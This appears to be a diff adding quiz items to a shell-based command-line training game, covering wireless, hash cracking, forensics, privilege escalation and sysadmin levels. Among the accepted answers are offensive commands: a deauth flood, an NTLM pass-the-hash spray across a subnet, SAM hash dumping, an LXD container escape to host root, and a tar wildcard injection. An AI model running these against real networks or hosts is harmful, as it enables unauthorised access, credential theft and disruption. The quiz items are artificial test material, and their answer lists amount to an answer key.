@@ -2379,6 +2379,11 @@ gen_level26() {
   questions+=("Scan for nearby classic Bluetooth (BR/EDR) devices|bluetoothctl scan bredr|sudo bluetoothctl scan bredr|hcitool scan|sudo hcitool scan")
   questions+=("Scan for nearby Bluetooth Low Energy (BLE) devices|bluetoothctl scan le|sudo bluetoothctl scan le|bluetoothctl --timeout 10 scan le|sudo bluetoothctl --timeout 10 scan le|hcitool lescan|sudo hcitool lescan")
   questions+=("Bettercap WiFi recon module|bettercap -iface ${wiface} -eval 'wifi.recon on'|sudo bettercap -iface ${wiface} -eval 'wifi.recon on'")
+  questions+=("Connect to SSID ${W}CorpWiFi${C} via nmcli (password 'pass123')|nmcli dev wifi connect CorpWiFi password pass123|nmcli device wifi connect CorpWiFi password pass123|sudo nmcli dev wifi connect CorpWiFi password pass123|sudo nmcli device wifi connect CorpWiFi password pass123")
+  questions+=("List saved nmcli connection profiles|nmcli connection show|nmcli con show|nmcli c show|nmcli c")
+  questions+=("Show wireless regulatory domain|iw reg get|sudo iw reg get|iw reg|sudo iw reg")
+  questions+=("Multi-vector deauth flood on AP ${W}${mac}${C} channel 6 (mdk4)|mdk4 ${wiface}mon d -B ${mac} -c 6|sudo mdk4 ${wiface}mon d -B ${mac} -c 6")
+  questions+=("BLE GATT enumerate services on ${W}${mac}${C}|gatttool -b ${mac} -I|gatttool -t random -b ${mac} -I|sudo gatttool -b ${mac} -I|sudo gatttool -t random -b ${mac} -I")
 }
 
 # Level 27: Hash Cracking
@@ -2437,6 +2442,12 @@ gen_level27() {
   questions+=("Preview rule expansion without cracking§hashcat -a 0 -r /usr/share/hashcat/rules/best64.rule --stdout ${wordlist}§hashcat --stdout -r /usr/share/hashcat/rules/best64.rule ${wordlist}§hashcat -r /usr/share/hashcat/rules/best64.rule --stdout ${wordlist}")
   questions+=("Kerberoast: request TGS tickets via impacket (DC at ${ip})|impacket-GetUserSPNs -request -dc-ip ${ip} domain/user:pass -outputfile ${hash}|GetUserSPNs.py -request -dc-ip ${ip} domain/user:pass -outputfile ${hash}")
   questions+=("Extract NTLM hashes from mimikatz output§grep -oP 'NTLM\\s+:\\s+\\K[a-f0-9]{32}' mimikatz.txt > ${hash}§grep -oE '[a-f0-9]{32}' mimikatz.txt > ${hash}§awk '/NTLM/ {print \$NF}' mimikatz.txt > ${hash}")
+  questions+=("Extract GPG keyring hash for cracking|gpg2john secring.gpg > ${hash}|~^gpg2john secring\\.gpg > .+$")
+  questions+=("Extract SSH private key hash for cracking|ssh2john ~/.ssh/id_rsa > ${hash}|ssh2john.py ~/.ssh/id_rsa > ${hash}|~^ssh2john(\\.py)? ~/\\.ssh/id_rsa > .+$")
+  questions+=("Extract MS Office document hash for cracking|office2john document.docx > ${hash}|office2john.py document.docx > ${hash}|~^office2john(\\.py)? document\\.docx > .+$")
+  questions+=("List hashcat compute devices (CUDA/HIP/OpenCL/Metal)|hashcat -I|hashcat --backend-info")
+  questions+=("Show uncracked (left) NTLM hashes from ${W}${hash}${C}|hashcat -m 1000 ${hash} --left|hashcat --left -m 1000 ${hash}|hashcat -m 1000 --left ${hash}")
+  questions+=("Spray NTLM hash across SMB subnet ${W}${ip}/24${C} as ${user}|netexec smb ${ip}/24 -u ${user} -H ${hash}|nxc smb ${ip}/24 -u ${user} -H ${hash}|crackmapexec smb ${ip}/24 -u ${user} -H ${hash}")
 }
 
 # Level 28: Forensics
@@ -2492,6 +2503,11 @@ gen_level28() {
   questions+=("Scan ${W}${dir}${C}/ recursively with YARA ruleset rules.yar|yara -r rules.yar ${dir}/|yara --recursive rules.yar ${dir}/|yara -r rules.yar ${dir}|yara --recursive rules.yar ${dir}")
   questions+=("Find CTF flags inside ${W}${bin}${C} (pattern flag{...})§strings ${bin} | grep -oE 'flag\\{[^}]+\\}'§strings -a ${bin} | grep -oE 'flag\\{[^}]+\\}'§strings ${bin} | grep -oP 'flag\\{[^}]+\\}'§rg -ao 'flag\\{[^}]+\\}' ${bin}")
   questions+=("Detect JPEG steganography (outguess/F5/JSteg) in ${W}${photo}${C}|stegdetect ${photo}|stegdetect -tjopi ${photo}")
+  questions+=("Dump NTLM hashes from offline SAM/SYSTEM hives in ${W}${dir}${C}|impacket-secretsdump -sam ${dir}/SAM -system ${dir}/SYSTEM LOCAL|secretsdump.py -sam ${dir}/SAM -system ${dir}/SYSTEM LOCAL|impacket-secretsdump -system ${dir}/SYSTEM -sam ${dir}/SAM LOCAL")
+  questions+=("Parse Windows event log to JSONL|evtx_dump -o jsonl Security.evtx > sec.jsonl|evtx_dump Security.evtx -o jsonl > sec.jsonl|~^evtx_dump (-o jsonl Security\\.evtx|Security\\.evtx -o jsonl) > .+$")
+  questions+=("Build super-timeline from disk image ${W}${img}${C} into plaso.db|log2timeline.py plaso.db ${img}|log2timeline plaso.db ${img}")
+  questions+=("Recover deleted file by inode 12345 from ${W}${img}${C}|icat ${img} 12345 > recovered.bin|icat -r ${img} 12345 > recovered.bin")
+  questions+=("Analyze ${W}${bin}${C} with rizin (radare2 maintained fork)|rizin -A ${bin}|rz -A ${bin}|rizin -qc 'aaa; afl' ${bin}|rz -qc 'aaa; afl' ${bin}")
 }
 
 # Level 29: Privilege Escalation
@@ -2544,6 +2560,16 @@ gen_level29() {
   questions+=("Triage linpeas output for high-confidence (95-99%) findings§./linpeas.sh | grep -E '\\[95%|\\[97%|\\[99%'§bash linpeas.sh | grep -iE '95%|99%|CVE-[0-9]'§linpeas.sh 2>/dev/null | grep -E '\\[95\\]|\\[97\\]|\\[99\\]'")
   questions+=("Find writable systemd service files|find /etc/systemd/system /lib/systemd/system -writable -name '*.service' 2>/dev/null|find /etc/systemd/system -perm -o+w -name '*.service' 2>/dev/null|find /etc/systemd/system /usr/lib/systemd/system -writable -name '*.service' 2>/dev/null")
   questions+=("Tar wildcard injection: drop checkpoint files in cwd before cron tar runs§touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'§echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh shell.sh'§printf '' > '--checkpoint=1'; printf '' > '--checkpoint-action=exec=sh shell.sh'")
+  questions+=("LXD privesc step 2: attach host root as recursive disk to 'privesc'|lxc config device add privesc hostdisk disk source=/ path=/mnt recursive=true|sudo lxc config device add privesc hostdisk disk source=/ path=/mnt recursive=true")
+  questions+=("LXD privesc step 3: start the privileged container|lxc start privesc|sudo lxc start privesc")
+  questions+=("LXD privesc step 4: chroot into host filesystem via container|lxc exec privesc -- chroot /mnt sh|lxc exec privesc -- chroot /mnt /bin/sh|sudo lxc exec privesc -- chroot /mnt sh|sudo lxc exec privesc -- chroot /mnt /bin/sh")
+  questions+=("Check glibc for Looney Tunables (CVE-2023-4911, vuln glibc 2.34-2.38)§ldd --version | head -1§getconf GNU_LIBC_VERSION§rpm -q glibc 2>/dev/null§dpkg -l libc6 2>/dev/null§ldd --version")
+  questions+=("Check runc for Leaky Vessels (CVE-2024-21626, fixed in 1.1.12)|runc --version|docker info 2>/dev/null | grep -i runc|crictl version")
+  questions+=("Check OpenSSH for regreSSHion (CVE-2024-6387, vuln 8.5p1-9.7p1)|sshd -V 2>&1|ssh -V|ssh -V 2>&1")
+  questions+=("Auto-suggest kernel exploits for current host|linux-exploit-suggester.sh|./linux-exploit-suggester.sh|les.sh|./les.sh|bash linux-exploit-suggester.sh")
+  questions+=("Enumerate Windows host via SMB null session at ${W}${ip}${C}|enum4linux-ng -A ${ip}|enum4linux-ng ${ip}|enum4linux -a ${ip}")
+  questions+=("Collect BloodHound data from a Linux foothold|bloodhound-python -d corp.local -u ${user} -p pass -ns ${ip} -c All|bloodhound.py -d corp.local -u ${user} -p pass -ns ${ip} -c All|bloodhound-python -c All -d corp.local -u ${user} -p pass -ns ${ip}")
+  questions+=("Kubernetes: enumerate effective permissions of current ServiceAccount|kubectl auth can-i --list|kubectl auth can-i '*' '*'|kubectl auth can-i --list --as=system:serviceaccount:default:default")
 }
 
 # Level 30: ROOT
@@ -2627,6 +2653,20 @@ gen_level30() {
   questions+=("Inject 100ms latency + 5% loss on ${W}${iface}${C} with tc netem|tc qdisc add dev ${iface} root netem delay 100ms loss 5%|sudo tc qdisc add dev ${iface} root netem delay 100ms loss 5%")
   questions+=("List active live-kernel patches|kpatch list|sudo kpatch list|cat /sys/kernel/livepatch/*/enabled 2>/dev/null|ls /sys/kernel/livepatch/")
   questions+=("Soft-reboot into staged kernel via kexec (no BIOS)|kexec -e|sudo kexec -e|kexec --exec|sudo kexec --exec")
+  questions+=("Activate all LVM volume groups|vgchange -ay|sudo vgchange -ay|vgchange --activate y|sudo vgchange --activate y")
+  questions+=("Repair degraded LVM mirror/raid logical volume|lvconvert --repair vg0/data|sudo lvconvert --repair vg0/data")
+  questions+=("Online btrfs scrub (verify checksums) on /|btrfs scrub start /|sudo btrfs scrub start /|btrfs scrub start -B /|sudo btrfs scrub start -B /")
+  questions+=("Inspect file capabilities on ${W}${bin}${C}|getcap ${bin}|sudo getcap ${bin}")
+  questions+=("Drop all capabilities from ${W}${bin}${C}|setcap -r ${bin}|sudo setcap -r ${bin}")
+  questions+=("Show NVMe SMART/health log for /dev/nvme0|nvme smart-log /dev/nvme0|sudo nvme smart-log /dev/nvme0|nvme smart-log /dev/nvme0n1|sudo nvme smart-log /dev/nvme0n1")
+  questions+=("Set immutable bit on ${W}${txt}${C} (block even root edits)|chattr +i ${txt}|sudo chattr +i ${txt}")
+  questions+=("Vacuum journald to last 7 days|journalctl --vacuum-time=7d|sudo journalctl --vacuum-time=7d|journalctl --rotate && journalctl --vacuum-time=7d|sudo journalctl --rotate && sudo journalctl --vacuum-time=7d")
+  questions+=("Show policy routing rules|ip rule show|ip rule list|ip rule|sudo ip rule show")
+  questions+=("Trace open() syscalls system-wide with bcc|opensnoop-bpfcc|sudo opensnoop-bpfcc|opensnoop|sudo opensnoop")
+  questions+=("Trace TCP connects system-wide with bcc|tcpconnect-bpfcc|sudo tcpconnect-bpfcc|tcpconnect|sudo tcpconnect")
+  questions+=("Flush all nftables rules|nft flush ruleset|sudo nft flush ruleset")
+  questions+=("Migrate iptables ruleset to nft equivalent§iptables-save | iptables-restore-translate -f -§sudo iptables-save | sudo iptables-restore-translate -f -§iptables-save > rules.v4 && iptables-restore-translate -f rules.v4")
+  questions+=("Flush systemd-resolved DNS cache|resolvectl flush-caches|sudo resolvectl flush-caches|systemd-resolve --flush-caches|sudo systemd-resolve --flush-caches")
 }
 
 # ═══ SCENARIOS ═══
